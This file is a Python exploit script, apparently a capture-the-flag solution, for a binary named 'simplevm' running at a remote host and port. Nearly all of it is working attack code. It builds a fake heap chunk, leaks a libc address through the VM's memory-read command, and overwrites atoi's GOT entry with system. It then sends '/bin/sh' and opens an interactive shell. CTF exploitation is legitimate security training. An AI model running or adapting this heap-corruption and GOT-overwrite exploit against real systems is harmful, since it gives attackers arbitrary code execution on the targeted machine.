#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './simplevm'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'10.66.20.180', 'port':3001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_plt        = binf.sep_section['.got.plt']
addr_got_atoi       = binf.got['atoi']
addr_stack          = 0x604168

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

ip = 17
sp = 18

#==========

def attack(conn, **kwargs):
    vm = SimpleVM(conn)

    vm.write_mem(0x800, p64(0)+p64(0x801)+p64(addr_stack-0x18)+p64(addr_stack-0x10))
    for i in range(6):
        vm.add_break(i)

    write_dword(vm, 0x6070, 0x800)
    write_dword(vm, 0x6078, 0xa0-7)
    vm.remove_break(0)

    addr_libc_mainarena = u64(vm.read_mem(0x810, 8)) - 0x58
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    vm.base = 0
    vm.code = ''
    vm.push_imm(addr_got_plt)

    vm.write_reg(ip, 0)
    vm.write_reg(sp, 9)
    vm.write_mem(vm.base, vm.code)
    vm.run()

    vm.write_mem(addr_got_atoi - addr_got_plt, p64(addr_libc_system))

    conn.sendlineafter('>>\n', '/bin/sh')

def write_dword(vm, ofs, val):
    vm.base = val - 7
    vm.buf = ''
    x = vm.nop()
    vm.code += '\x15'
    start = vm.call_imm(x)
    
    vm.write_reg(ip, start)
    vm.write_reg(sp, (ofs-0x5870)/4 + 1)
    vm.write_mem(vm.base, vm.code)
    vm.run()
    
class SimpleVM:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter
        self.base           = 0
        self.code           = ''

    def run(self):
        self.sendlineafter('>>\n', '1')

    def write_mem(self, addr, data):
        self.sendlineafter('>>\n', '2')
        self.sendlineafter('addr:', str(hex(addr)))
        self.sendlineafter('len:', str(hex(len(data))))
        self.send(data)

    def read_mem(self, addr, length):
        self.sendlineafter('>>\n', '3')
        self.sendlineafter('addr:', str(hex(addr)))
        self.sendlineafter('len:', str(hex(length)))
        return self.recvuntil('1. ', drop=True)

    def write_reg(self, reg, val):
        self.sendlineafter('>>\n', '4')
        self.sendlineafter('regid:', str(hex(reg)))
        self.sendline(str(hex(val)))

    def add_break(self, addr):
        self.sendlineafter('>>\n', '6')
        self.sendlineafter('addr:', str(hex(addr)))

    def remove_break(self, addr):
        self.sendlineafter('>>\n', '7')
        self.sendlineafter('addr:', str(hex(addr)))

    def nop(self):
        n = len(self.code)
        self.code += chr(0x1)
        return self.base + n

    def call_imm(self, imm):
        n = len(self.code)
        self.code += chr(0xc | 1<<6)
        self.code += p32(imm)
        return self.base + n

    def push_imm(self, imm):
        n = len(self.code)
        self.code += chr(0xe | 1<<6)
        self.code += p32(imm)
        return self.base + n

    def jmp_imm(self, imm):
        n = len(self.code)
        self.code += chr(0x10 | 1<<6)
        self.code += p32(imm)
        return self.base + n

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
